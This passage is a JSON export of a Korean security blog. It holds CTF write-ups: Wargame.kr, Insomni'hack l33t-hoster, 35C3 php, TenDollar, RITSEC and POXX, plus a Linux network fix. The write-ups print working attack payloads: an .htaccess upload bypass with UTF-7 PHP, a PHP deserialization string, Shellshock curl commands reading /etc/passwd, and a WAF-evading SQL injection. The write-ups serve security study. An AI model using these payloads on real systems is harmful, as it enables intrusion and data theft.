        "content": "오랜만에 다시 Wargame.kr을 풀어보았다.이번 문제는 DB is really GOOD이다.문제 정보는 다음과 같다.What kind of this Database?you have to find correlation between user name and database.홈페이지에 들어가면 아래와 같이 USER의 명을 정할 수 있는 창이 있다.그리고 여기에 아무런 값이나 입력하면, 그 값이 내 USER 명이 되며, 메모를 입력할 수 있는 창이 나타난다.메모를 입력하면 하단에 내가 입력 한 메모들이 나오게 된다.난 처음에 이 메모를 입력하는 부분에서 SQL Injection이 터진다고 생각 해 이 부분으로 삽질을 했었다 ㅠㅠ그런데 다시 문제 정보를 보니, user name과 database의 연관 관계를 생각하라고 해서 다시 첫 번째 페이지로 돌아와 확인을 해 보았다.먼저 첫 번째 페이지의 소스코드는 다음과 같다.&lt;head&gt;&lt;script type=\"text/javascript\" src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;script src=\"http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js\"&gt;&lt;/script&gt;&lt;script text=\"javascript\"&gt;function fschk(f){ if(f.user_id.value==\"admin\"){  alert(\"dont access with 'admin'\");  return false; }}&lt;/script&gt;&lt;style&gt;\tbody {width:100%; height:100%; padding:0; margin:0;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div style='width:400px; margin:50 auto; text-align:center;'&gt; &lt;h2&gt;BLUEMEMO SYSTEM &lt;sub&gt;0.53 beta&lt;/sub&gt;&lt;/h2&gt; &lt;form method=\"post\" action=\"memo.php\" onsubmit=\"return fschk(this);\"&gt; USER &lt;input type='text' maxlength=16 size=16 name='user_id' /&gt; &lt;input type='submit' value='LOGIN' /&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;user_id의 값이 admin일 경우 dont access with 'admin'이라는 alert 창을 띄우고, 만약 admin이 아니라면 로그인 처리가 된다.그래서 일단 USER 창에 아무거나 입력해서 뭔가 변화를 볼 수 있는 문자를 찾아보았다.문제 이름이 DB is really GOOD이라서 SQL Injection이라고 생각 해 SQL Injection에 사용하는 특수문자들을 넣어봤는데, 그냥 그대로 잘 입력되었다.그런데 .을 입력하니 _로 바뀌는 것을 확인할 수 있었다.그래서 다른 특수문자들도 다 입력을 해 보았더니 ,.&lt;&gt;/?라고 입력 했을 때 아래와 같은 에러가 발생하는 것을 확인할 수 있었다.open('./db/wkrm_,_&lt;&gt;/...')와 __construct('./db/wkrm_,_&lt;&gt;/...') 함수 실행에서 문제가생겼다는 건데, 데이터베이스 파일을 오픈할 수 없다고 한다.그럼 ./db/wkrm_[USERNAME]/...에 각 사용자의 데이터베이스 파일이 저장 되는 것 같았다.그래서 정확히 오류를 야기한 문자와 뒤에 ...으로 표시 된 부분의 정확한 경로를 알기 위해 하나하나 문자를 입력 해 보았다.그 결과, /를 입력했을 때 동일한 오류가 발생하는 것을 알 수 있었다.그런데 생각해보니까 경로에 문제가 생긴 것이라면 /가 가장 유력했었다 ㅋㅋㅋ쨌든 데이터베이스 파일의 완전한 경로는 ./db/wkrm_[USERNAME].db라는 것을 알 수 있었다.그럼 이제 데이터베이스 파일을 확인해야 하는데, 어떤 사용자의 파일을 확인해야 하는가가 문제이다.아까 확인한 소스코드에 admin에 대한 필터링이 걸려 있으므로, admin이라는 user는 항상 존재한다는 것을 유추할 수 있다.때문에 ./db/wkrm_admin.db 파일에 접근 해 보았더니, wkrm_admin.db 파일을 다운받을 수 있었다..db 파일을 어떻게 열지 잠깐 고민하다가 그냥 HexEditor로 열어 보았다.그랬더니 아래에 ./dhkdndlswmdzltng.php에 플래그가 있다는 문자를 확인할 수 있었다.해당 경로로 접속 해 보니 플래그가 적혀있었다 ㅎFLAG : 577465fa90a0a13ebbb23782e0fa91c7a8340ad0 ",
        "url": "//wargame/wargame.kr/2019/02/08/wargame.kr-DB_is_really_GOOD.html"
      }
      ,
    
      "ctf-2019-2019-01-24-ctf-insomnihack2019-l33t-hoster-html": {
        "title": "[Insomni'hack 2019] l33t-hoster Write up(미완성)",
        "tags": "Write-up, CTF, insomnihack2019",
        "date": "January 24, 2019",
        "author": "",
        "category": "",
        "content": "이번에는 Insomni'hack teaser에 출제 된 l33t-hoster 문제의 풀이를 적어보려 한다.공교롭게도 문제를 풀다가 서버가 닫혀버려서 끝까지 풀진 못했다. ㅠㅠ문제 정보는 다음과 같다.You can host your l33t pictures here.홈페이지에 접속하면 아래와 같이 파일을 올릴 수 있는 페이지를 확인할 수 있다.파일 업로드를 하라고 하니 딱 웹 쉘 같은 것을 업로드 해야 할 것 같은 느낌이다.그런데 소스코드를 확인 해 보면 아래에 주석으로 /?source라고 적힌 부분이 있다.&lt;h3&gt;Your &lt;a href=images/a5d610a9bfe3775f2234f376f58a0cc404663bae/&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&lt;/ul&gt;&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=\"POST\" action=\"?\" enctype=\"multipart/form-data\"&gt;    &lt;input type=\"file\" name=\"image\"&gt;    &lt;input type=\"submit\" name=upload&gt;&lt;/form&gt;&lt;!-- /?source --&gt;친절하게 소스코드를 제공 해 주었다.소스코드는 다음과 같았다.&lt;?phpif (isset($_GET[\"source\"]))     die(highlight_file(__FILE__));session_start();if (!isset($_SESSION[\"home\"])) {    $_SESSION[\"home\"] = bin2hex(random_bytes(20));}$userdir = \"images/{$_SESSION[\"home\"]}/\";if (!file_exists($userdir)) {    mkdir($userdir);}$disallowed_ext = array(    \"php\",    \"php3\",    \"php4\",    \"php5\",    \"php7\",    \"pht\",    \"phtm\",    \"phtml\",    \"phar\",    \"phps\",);if (isset($_POST[\"upload\"])) {    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {        die(\"yuuuge fail\");    }    $tmp_name = $_FILES[\"image\"][\"tmp_name\"];    $name = $_FILES[\"image\"][\"name\"];    $parts = explode(\".\", $name);    $ext = array_pop($parts);    if (empty($parts[0])) {        array_shift($parts);    }    if (count($parts) === 0) {        die(\"lol filename is empty\");    }    if (in_array($ext, $disallowed_ext, TRUE)) {        die(\"lol nice try, but im not stupid dude...\");    }    $image = file_get_contents($tmp_name);    if (mb_strpos($image, \"&lt;?\") !== FALSE) {        die(\"why would you need php in a pic.....\");    }    if (!exif_imagetype($tmp_name)) {        die(\"not an image.\");    }    $image_size = getimagesize($tmp_name);    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {        die(\"lol noob, your pic is not l33t enough\");    }    $name = implode(\".\", $parts);    move_uploaded_file($tmp_name, $userdir . $name . \".\" . $ext);}echo \"&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;\";foreach(glob($userdir . \"*\") as $file) {    echo \"&lt;li&gt;&lt;a href='$file'&gt;$file&lt;/a&gt;&lt;/li&gt;\";}echo \"&lt;/ul&gt;\";?&gt;&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=\"POST\" action=\"?\" enctype=\"multipart/form-data\"&gt;    &lt;input type=\"file\" name=\"image\"&gt;    &lt;input type=\"submit\" name=upload&gt;&lt;/form&gt;&lt;!-- /?source --&gt;파일을 업로드 할 수 있긴 한데 제약조건이 너무 많다.정리 해 보면 다음과 같다.  파일 명에서 . 앞에 아무런 문자도 없으면 안된다. 즉, .htaccess는 . 뒤의 부분만 있기 때문에 업로드 할 수 없다.  $disallowed_ext에 있는 확장자는 업로드 할 수 없다.  파일의 내용에는 &lt;?가 들어있을 수 없다.  업로드 한 파일은 exif_imagetype 함수에서 검사하는 이미지 형식 중 하나여야 한다.  업로드 한 파일의 가로, 세로 크기는 1337이어야 한다.이 모든 조건을 통과하면 images/RANDOM_BYTES/FILENAME.EXT의 경로에 파일이 업로드 된다.그럼 일단 파일 업로드 기능이 있으므로 RCE(Remote Code Execution)을 하기 위해 php 파일을 업로드 하면 문제를 쫘라락 풀 수 있을 것 같다.그런데 php 확장자를 비롯해서 php 코드를 실행할 수 있는 거의 모든 확장자(일단 내가 생각할 땐 전부인 것 같은데, 혹시 어디서 뭐가 나올지 모르므로 거의 모든이라고 쓴다.)는 $disallowed_ext 변수 안에 들어있다.그렇다면 다른 확장자를 업로드 하더라도 php가 실행할 수 있도록 만들면 될 것 같다 ㅎㅎ이를 위해서 .htaccess를 업로드 해야한다.그런데 앞서 말했듯이, . 앞에 아무런 문자도 없다면 업로드 할 수 없다.이에 소스코드를 다시 살펴보면 아래와 같은 부분을 확인할 수 있다.    $parts = explode(\".\", $name);    $ext = array_pop($parts);    if (empty($parts[0])) {        array_shift($parts);    }즉, 만약에 파일 명을 ..htaccess라고 하면, array_shift 한 결과가 아래와 같이 나온다.Array(    [0] =&gt; )때문에 count($parts)는 1이 되어 if(count($parts) === 0) 부분을 그냥 지나쳐갈 수 있다.또한 파일을 업로드 할 때, $name.\".\".$ext 형태로 하는데, $name은 $_FILES[\"image\"][\"name\"];이기 때문에 빈 값이 될 것이고, $ext는 array_pop($parts);이기 때문에 $parts의 마지막 값인 htaccess가 되어 최종적으로 .htaccess의 이름으로 업로드 될 것이다.그러면 이제 아래와 같이 .htaccess 파일을 구성하여 업로드 하면, 내가 원하는 aaa라는 확장자를 php로 실행시킬 수 있게 될 것이다.AddType application/x-httpd-php .aaa그런데 한가지 더 문제가 있었다.바로 위의 파일을 업로드 했을 때, exif_imagetype()를 통과한 결과 유효한 이미지의 값을 반환 해 주어야 한다는 것이다.그렇다면 파일의 헤더를 이미지 파일처럼 맞춰주면 될 것 같은데, 지금 업로드 하는 파일은 .htaccess로 사용되어야 하기 때문에 .htaccess을 해석할 때는 무시될 수 있는 이미지 파일 헤더를 찾아야 한다.일단 exif_imagetype() 함수에서 유효한 이미지로 취급하는 형태는 여기에서 확인할 수 있다.익숙한 형태가 보이는데 그 중, IMAGETYPE_XBM를 위키피디아에서 찾아보면 아래와 같은 부분을 확인할 수 있다.FormatXBM files differ markedly from most image files in that they take the form of C source files. This means that they can be compiled directly into an application without any preprocessing steps, but it also makes them far larger than their raw pixel data. The image data is encoded as a comma-separated list of byte values, each written in the C hexadecimal notation, ‘0x13’ for example, so that multiple ASCII characters are used to express a single byte of image information.[4]XBM data consists of a series of static unsigned char arrays containing the monochrome pixel data. When the format was in common use, an XBM typically appeared in headers (.h files) which featured one array per image stored in the header. The following piece of C code exemplifies an XBM file:#define test_width 16#define test_height 7static char test_bits[] = {0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 };즉, 파일의 시작은 #으로 시작하며, 내가 파일의 width와 height도 설정할 수 있다.그런데 # 뒤의 문자열은 .htaccess에서 주석으로 해석한다.따라서 .htaccess 파일 상단에 xbm 파일처럼 width와 height의 크기를 설정 해 준다면, exif_imagetype()도 통과하고, 마지막에 이미지의 가로와 세로의 길이가 1337 이어야 하는 조건문을 통과하면서 .htaccess에서는 해당 줄을 주석으로 처리 해 무시하게 될 것이다.이 내용들을 바탕으로 다시 .htaccess 파일의 내용을 구성하면 다음과 같다.#define test_width 1337#define test_height 1337AddType application/x-httpd-php .aaa다 된 것 같았는데 또 하나의 문제점이 있었다.바로 &lt;?를 사용할 수 없다는 점이었다.그래서 .htaccess에 대해서 검색하다가 인터넷에서 htaccess 치트엔진을 찾을 수 있었다.나는 여기에서 아래와 같은 부분을 사용하기로 했다.그래서 변경 한 .htaccess는 다음과 같다.  .htaccess (업로드 할 때는 ..htaccess)    #define test_width 1337#define test_height 1337AddType application/x-httpd-php .aaaphp_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"      그럼 이제 새로운 .aaa 파일을 업로드 하는데, 코드의 내용을 UTF-7로 인코딩 해 업로드 하면 아마 자동으로 UTF-7 디코딩을 하여 실행할 수 있을 것이다.code.aaa라는 파일을 아래와 같이 만들었다.  code.aaa (원본)    #define test_width 1337#define test_height 1337&lt;? phpinfo();        code.aaa (UTF-7 버전)    #define test_width 1337#define test_height 1337+ADw?php phpinfo()+ADs-      UTF-7 인코딩은 여기에서 했다.파일 두개를 업로드 한 결과 아래와 같이 드디어 phpinfo()를 실행할 수 있었다!그래서 그냥 code.aaa에 &lt;?php system($_GET['cmd']);를 넣으면 되지 않을까 했는데 안되더라…phpinfo()에서 다시 보니까 disable_functions에 system 부터 시작해서 코드를 실행할 수 있는 함수들이 다 들어가있다. (눙물…)그래서 인터넷을 뒤지다 한 가지 방법을 찾았는데, 바로 mail() 함수와 putenv() 함수를 이용 해 .so 파일을 업로드 하여 실행시키는 것이다.How to bypass disable_functions and open_basedir같은 내용인데 중국어로 적힌 블로그 글도 있었다. 여기가 소스코드는 더 깔끔하게 있는 것 같다.php에서 mail() 함수를 실행할 때, execve 함수를 호출한다고 한다.때문에 내가 만약 .so 파일을 업로드 하고, putenv()를 통해 LD_PRELOAD를 내가 업로드 한 .so 파일로 변경할 수 있다면, 원하는 명령어를 실행할 수 있게 된다.근데… 여기까지 하고 급한 일을 해결하고 보니 서버가 닫혔다… ㅠㅠ그냥 급한 일을 미뤄두고 문제부터 풀 걸 그랬다 ㅠㅠ만약 나중에 기회가 된다면 이 내용을 실습해서 따로 올리는 것으로 하고 이 Write up은 여기까지만 해야할 것 같다.",
        "url": "//ctf/2019/2019/01/24/ctf-insomnihack2019-l33t-hoster.html"
      }
      ,
    
      "ctf-2018-2018-12-30-ctf-35c3ctf2018-php-html": {
        "title": "[35C3 CTF 2018] php Write up",
        "tags": "Write-up, CTF, 35C3CTF2018",
        "date": "December 30, 2018",
        "author": "",
        "category": "",
        "content": "어제 ctftime을 돌아보다가 35C3 CTF가 하고 있길래 한 문제를 풀어보았다.원래 몇개 더 풀어보고 싶었는데 어떻게 푸는건지를 모르겠다.아직 Write up이 안올라왔던데, 나중에 올라오면 찾아봐야겠다.일단 php 문제 정보는 다음과 같다.PHP's unserialization mechanism can be exceptional. Guest challenge by jvoisin.Files at https://35c3ctf.ccc.ac/uploads/php-ff2d1f97076ff25c5d0858616c26fac7.tar. Challenge running at: nc 35.242.207.13 1파일을 다운받아 압축을 풀어보면 php.php 파일을 확인할 수 있다.php.php의 내용은 다음과 같다.&lt;?php$line = trim(fgets(STDIN));$flag = file_get_contents('/flag');class B {  function __destruct() {    global $flag;    echo $flag;  }}$a = @unserialize($line);throw new Exception('Well that was unexpected…');echo $a;STDIN으로 입력 값을 받아 $line에 저장한 후, 이를 unserialize 함수를 통해 unserialize 한 값을 $a에 저장한다.마지막으로 $a를 출력 해 준다.그런데 위를 살펴보면 B라는 class가 선언되어 있고, __destruct 함수 안에 $flag함수를 출력 해 준다.아무래도 unserialize 함수의 취약점(?)을 가지고 푸는 문제인 것 같아 일단 unserialize함수가 무엇인지를 찾아보았다.  serialize()      PHP 변수들을 string으로 만들어 주는 함수ex) serialize(array(3, 4, 5, 6)) =&gt; a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}a:4 =&gt; 배열의 크기는 4object 일 경우 O:object_name_length:”object_name”:object_size:ex) O:8:”stdclass”:8:i:0;i:3 =&gt; 배열 첫 번째 인덱스의 값은 3int가 아닌 string 형태 일 경우 s:string_length:”string”;  ex) s:3:”one”;    unserialize()      serialize 된 변수를 PHP 값으로 변환ex) unserialize(a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}) =&gt; Array([0] =&gt; 3 [1] =&gt; 4 [2] =&gt; 5 [3] =&gt; 6)  그런데 찾아보다 보니, 아래와 같은 블로그를 찾을 수 있었다.http://qkqhxla1.tistory.com/444php object injection에 대한 설명인데, 취약점 exploit을 위한 아래의 두 가지 조건이 php 문제와 정확히 일치한다.  어플리케이션은 php의 매직 메소드(__wakeup이나 destrust 같은)를 구현한 클래스를 가지고 있어야 한다.  공격중의 모든 클래스들은 취약한 unserialize()가 호출되기 전에 선언되어야 한다.그래서 아래와 같이 입력 해 보았다.O:1:\"B\":1{s:4:\"flag\";s:5:\"/flag\";}그러면 B 클래스에 flag라는 이름으로 /flag를 할당하고 __destruct 메소드를 호출하며 echo $flag를 실행 할 것이다.문제에 접속하여 위와 같이 입력 했더니 flag를 읽을 수 있었다!$ nc 35.242.207.13 1O:1:\"B\":1{s:4:\"flag\";s:5:\"/flag\";}35C3_php_is_fun_php_is_funPHP Fatal error:  Uncaught Exception: Well that was unexpected… in /home/user/php.php:16Stack trace:#0 {main}  thrown in /home/user/php.php on line 16그런데 이 문제 다시 생각 해 보니 어찌됬든 __destruct 메소드만 호출하도록 하면 되서 굳이 내가 한 방식 말고 O:1:\"B\":1:{} 이런식으로 해도 문제가 풀릴 것 같다.근데 뭐 풀었으니 됬다 ㅎㅎㅎ35C3_php_is_fun_php_is_fun",
        "url": "//ctf/2018/2018/12/30/ctf-35c3ctf2018-php.html"
      }
      ,
    
      "ctf-2018-2018-12-16-ctf-tendollar2018-ping-ping-ping-html": {
        "title": "[TenDollar 2018] Ping! Ping! Ping! Write up",
        "tags": "Write-up, CTF, TenDollar2018",
        "date": "December 16, 2018",
        "author": "",
        "category": "",
        "content": "몇 주 전에 TenDollar 팀이 주최 한 CTF에 참여했다.한 3문제 정도 푼 것 같은데, 그 중에 Ping! Ping! Ping! 문제는 지금도 풀어볼 수 있어 이 문제에 대한 풀이를 적어두려 한다.문제 정보는 다음과 같다.ping! ping! ping!첨부파일을 확인 해 보면, pcapng 파일이 있는 것을 확인할 수 있다.pcapng 파일을 보면 두 IP가 ICMP Request, ICMP Reply를 주고받은 패킷이 있다.이에 데이터를 영역을 살펴보니, 아래와 같은 내용이 있었다.PK와 Content_Types라는 글자가 있는 것으로 보아 해당 파일은 HWP인 것 같았다.즉 이 pcapng 파일은 HWP 파일을 ICMP 프로토콜을 통해 전달 한 패킷을 캡처 한 것이라는 것을 알 수 있었다.전송 한 파일을 추출하기 위해서는 Python으로 아래와 같이 코드를 구현하면 된다.import dpktimport socketdef inet_to_str(inet):\ttry:\t\treturn socket.inet_ntop(socket.AF_INET, inet)\texcept ValueError:\t\treturn socket.inet_ntop(socketAF_INET6, inet)f = open(\"ping_ping_ping.pcapng\")pcap = dpkt.pcap.Reader(f)f1 = open(\"extract.hwp\", \"w\")newfile = \"\"for timestamp, buf in pcap:\teth = dpkt.ethernet.Ethernet(buf)\tip = eth.data\tif isinstance(ip.data, dpkt.icmp.ICMP):\t\ticmp = ip.data\t\t\t\tif inet_to_str(ip.src) == \"10.211.55.6\":\t\t\tnewfile += icmp.data.dataf1.write(newfile)그런데 위의 코드를 실행하면 아래와 같은 오류가 발생한다.Traceback (most recent call last):  File \"ex.py\", line 12, in &lt;module&gt;    pcap = dpkt.pcap.Reader(f)  File \"/usr/local/lib/python2.7/dist-packages/dpkt/pcap.py\", line 251, in __init__    raise ValueError('invalid tcpdump header')ValueError: invalid tcpdump header때문에 pcapng 파일을 아래의 명령어를 사용하여 pcap 파일로 변경 해 주어야 한다.editcap -F libpcap -T ether ping_ping_ping.pcapng ping_ping_ping.pcap이 후 다시 위의 코드를 아래와 같이 수정 해 실행시키면 HWP 파일을 얻을 수 있다.import dpktimport socketdef inet_to_str(inet):\ttry:\t\treturn socket.inet_ntop(socket.AF_INET, inet)\texcept ValueError:\t\treturn socket.inet_ntop(socketAF_INET6, inet)f = open(\"ping_ping_ping.pcap\")pcap = dpkt.pcap.Reader(f)f1 = open(\"extract.hwp\", \"w\")newfile = \"\"for timestamp, buf in pcap:\teth = dpkt.ethernet.Ethernet(buf)\tip = eth.data\tif isinstance(ip.data, dpkt.icmp.ICMP):\t\ticmp = ip.data\t\t\t\tif inet_to_str(ip.src) == \"10.211.55.6\":\t\t\tnewfile += icmp.data.dataf1.write(newfile)그럼 결과로 extract.hwp 파일을 얻을 수 있고 해당 파일을 열면 아래와 같이 플래그를 확인할 수 있다.TDCTF{Do_you_know_about_the_icmp_protocol?}",
        "url": "//ctf/2018/2018/12/16/ctf-tendollar2018-ping-ping-ping.html"
      }
      ,
    
      "ctf-2018-2018-11-19-ctf-ritsec2018-what-a-cute-dog-html": {
        "title": "[RITSEC 2018] What a cute dog! Write up",
        "tags": "Write-up, CTF, RITSEC2018",
        "date": "November 19, 2018",
        "author": "",
        "category": "",
        "content": "주말에 잠깐 짬이 나서 RITSEC CTF에 참여했다.웹 몇개랑 암호 한개 정도 풀었는데 그 중에 한 문제에 대한 Write Up을 써 두려고 한다.문제 정보는 다음과 같다.This dog is shockingly cute!fun.ritsec.club:8008Author: sandw1ch문제에 접속하면 아래와 같은 화면이 보인다.아무것도 없어 보이는데, 페이지 소스보기를 하면 iframe으로 /cgi-bin/stats를 호출하는 것을 알 수 있다.&lt;html&gt;\t&lt;head&gt;    &lt;style&gt;    body {        background-image: url(\"https://wallpaper-house.com/data/out/6/wallpaper2you_129872.jpg\");    }    &lt;/style&gt;\t&lt;meta name=\"generator\" content=\"vi2html\"&gt;\t&lt;/head&gt;\t&lt;body&gt;\t&lt;/br&gt;&lt;/br&gt;Has Anyone Really Been Far Even as Decided to Use Even Go Want to do Look More Like?&lt;/br&gt;&lt;/br&gt;Wow, this dog is shockingly cute!&lt;/br&gt;\t&lt;/br&gt;Stats:\t&lt;/br&gt;\t&lt;iframe frameborder=0 width=800 height=600 src=\"/cgi-bin/stats\"&gt;&lt;/iframe&gt;\t&lt;/body&gt;&lt;/html&gt;해당 경로로 들어가면 아까 봤던 두 줄의 정보만 출력될 뿐, 아무것도 나오는 것이 없다.Sun Nov 18 14:11:01 UTC 201814:11:01 up 1 day, 21:58, 0 users, load average: 0.11, 0.31, 0.29뭘까 잠시 고민하다가, 아무 의미 없는 페이지에 뜬금포로 /cgi-bin/stats로 들어 가 어떤 정보를 출력하는게 의심스러워서, 이를 가지고 문제를 푸는 것이 아닌가 생각 해 보았다.그래서 구글에 cgi-bin/stats exploit라고 검색 해 보았는데 깃허브에서 이와 관련 된 CVE를 찾을 수 있었다.CVE-2014-6271해당 취약점을 가지고 있는 Debian Linux system에서 curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'\" http://your-ip:8080/cgi-bin/stats와 같은 코드를 사용 해 임의의 코드를 실행할 수 있다.이에 위의 코드를 그대로 문제 서버에 적용 해 보았다.그랬더니 아래와 같이 /etc/passwd가 출력 된 것을 확인할 수 있었다.# curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'\" http://fun.ritsec.club:8008/cgi-bin/statsroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/sh그래서 이를 가지고 플래그의 위치를 찾기 위해 find 명령어를 실행하도록 아래와 같이 테스트 해 보았다.# curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'find / -name \"*flag*\"'\" http://fun.ritsec.club:8008//cgi-bin/stats/proc/sys/kernel/acpi_video_flags/proc/sys/kernel/sched_domain/cpu0/domain0/flags/proc/sys/kernel/sched_domain/cpu1/domain0/flags/proc/kpageflags/usr/lib/perl/5.14.2/auto/POSIX/SigAction/flags.al/usr/lib/perl/5.14.2/bits/waitflags.ph/opt/flag.txt/sys/devices/pnp0/00:04/tty/ttyS0/flags/sys/devices/platform/serial8250/tty/ttyS2/flags/sys/devices/platform/serial8250/tty/ttyS3/flags/sys/devices/platform/serial8250/tty/ttyS1/flags/sys/devices/virtual/net/eth0/flags/sys/devices/virtual/net/lo/flags/sys/module/scsi_mod/parameters/default_dev_flags그랬더니 /opt/flag.txt라는 파일을 찾을 수 있었다.그래서 이번에는 /opt/flag.txt를 읽도록 아래와 같이 실행 해 보았더니 플래그를 찾을 수 있었다.# curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /opt/flag.txt'\" http://fun.ritsec.club:8008//cgi-bin/statsRITSEC{sh3ll_sh0cked_w0wz3rs}RITSEC{sh3ll_sh0cked_w0wz3rs}",
        "url": "//ctf/2018/2018/11/19/ctf-ritsec2018-What-a-cute-dog.html"
      }
      ,
    
      "error-linux-2018-11-18-linux-network-interface-html": {
        "title": "[Linux 오류] Cannot find device ens33",
        "tags": "Error, Linux",
        "date": "November 18, 2018",
        "author": "",
        "category": "",
        "content": "고정 IP를 사용하던 Ubuntu 가상머신을 다시 동적 IP를 사용하도록 변경해야 하는 일이 있었다.그런데 아무리 설정을 변경해도 네트워크를 시작할 수 없었다.이에 대한 해결 방법을 적어두려 한다.고정 IP를 사용할 지, 동적 IP를 사용할 지 설정하기 위해서는 /etc/network/interfaces 파일을 수정하면 된다.보통 동적 IP를 사용할 때는 아래와 같다.# This file describes the network interfaces available on your system# and how to activate them. For more information, see interfaces(5).#source /etc/network/interfaces.d/*auto loiface lo inet loopbackauto ens3iface ens33 inet dhcp정적 IP를 사용하고 싶다면 아래와 같이 설정 부분을 수정하면 된다.# This file describes the network interfaces available on your system# and how to activate them. For more information, see interfaces(5).#source /etc/network/interfaces.d/*auto loiface lo inet loopbackauto ens3iface ens33 inet staticaddress YOUR_IP_ADDRESSnetmask TOUR_NETMASKgateway YOUR_GATEWAYdns-nameservers YOUR_DNS_NAMESERVER이 후, systemctl restart networking.service를 하면 IP가 원하는데로 바뀌어 있는 것을 확인할 수 있다.그런데, 나는 고정 IP를 사용하던 VM을 동적 IP를 사용하도록 변경해야 하는 상황이었다.그래서 맨 위의 파일의 내용으로 /etc/network/interfaces를 수정한 후, systemctl restart netwoking.service를 했더니 계속해서 오류만 났다.이 때, 해당 서비스를 재시작 할 수 없는 이유를 알기 위해서는 systemctl status netwoking.service 명령어를 사용하면 된다.위의 명령어를 확인 해 보니 아래와 같은 로그들이 남아있었다.Unknown interface ens33...Cannot find device \"ens33\"내가 /etc/network/interfaces/에 적어 둔 ens33이라는 인터페이스가 없다는 오류였다.내 서버의 interface를 확인하기 위해서는 아래와 같은 명령어를 사용하면 된다.# lshw -C network그럼 network와 관련 된 정보가 쭉 뜨는데, 이 중 logical name을 확인 해 보면 된다.내 VM의 경우, ens33이 아니라 ens34를 사용하고 있었다.이에, /etc/network/interfaces에서 ens33을 ens34로 변경 해 주고 다시 network를 재시작 했더니 문제를 해결할 수 있었다.",
        "url": "//error/linux/2018/11/18/linux-network-interface.html"
      }
      ,
    
      "ctf-2018-2018-11-15-ctf-poxx2018-writeup-html": {
        "title": "[POXX2018-Final] Groot / 2+3 / WHATISTHIS Write up",
        "tags": "Write-up, CTF, POXX2018",
        "date": "November 15, 2018",
        "author": "",
        "category": "",
        "content": "이번에 매우 운이 좋게도 2018 POXX 본선에 참가할 수 있었다.본선에서 총 4문제를 풀었는데, 그 중 3문제에 대해서 Write-up을 작성하려 한다.Groot이 문제는 URL에 접속하면 바로 소스코드가 주어지는 SQL Injection 문제였다.코드는 다음과 같다.&lt;?phpinclude \"./config.php\";$waf = \"/groot|0x|-|#|mid|=|\\/|\\\\|un|_|in|re|at|select|idx|no|li|\\s/i\";$mysql = dbconnect();if(isset($_GET['id'])) {    if(preg_match($waf, $_GET['id']))        exit(\"power of XX, power of WAF !\");    $query = \"select id from user where id='{$_GET['id']}'\";    $row = mysqli_fetch_array($mysql-&gt;query($query));    if($row['id'] === \"groot\")        solve();    else        echo \"&lt;h3&gt;I'M GROOT ! &lt;/h3&gt;\";}highlight_file(__FILE__);?&gt;문제를 풀 때 테스트를 위해 내 서버에 소스코드를 옮겨왔는데, 그 때 데이터베이스를 연결하는 부분은 살짝 수정 해 완전히 똑같은 코드는 아니다. (문제 푸는데는 전혀 상관이 없다.)코드에서 solve() 함수로 가기 위한 조건을 살펴보면 쿼리를 실행 한 결과 나온 id의 값이 groot여야 한다.또한 쿼리에서는 GET 방식으로 id의 값을 받는다.그런데 필터링이 너무 많아서 groot는 물론이고 like, union, 공백, = 등등을 사용 할 수 없다.다행인건 '는 사용할 수 있다는 점이다.어떻게 풀지 팀원들과 고민하다가 char와 &gt;, &lt;를 사용하자는 이야기가 나왔다.그래서 처음에 아래와 같이 값을 넘겨주었었다.?id='||id&gt;char(103,114,111,111,115)||'이러면 id가 groos보다 큰 값을 테이블에서 찾아 추출하게 된다.그런데 아무리 해도 I'M GROOT !만 출력됬다.그래서 groosa, groosb 이런식으로 값이 있는건가 해서 groosz보다 큰 값을 추출하도록 도 해보았는데 역시나 안됬다.계속 grooszz...z 이런식으로 z의 갯수를 늘려서 해보다가 한도끝도 없는 것 같아서 그냥 조건을 한개 더 추가 해 주었다.?id='||id&gt;char(103,114,111,111,115,127)%26%26id&lt;char(103,114,111,111,117,33)||'이러면 id의 값이 groosz보다 크고 groot!보다 작은 값을 추출 해 준다.그랬더니 플래그가 뿅 하고 나타났다.FLAG : POX{I'm Groooooooooot.}2+3이 문제는 숫자만 잔뜩 있는 파일을 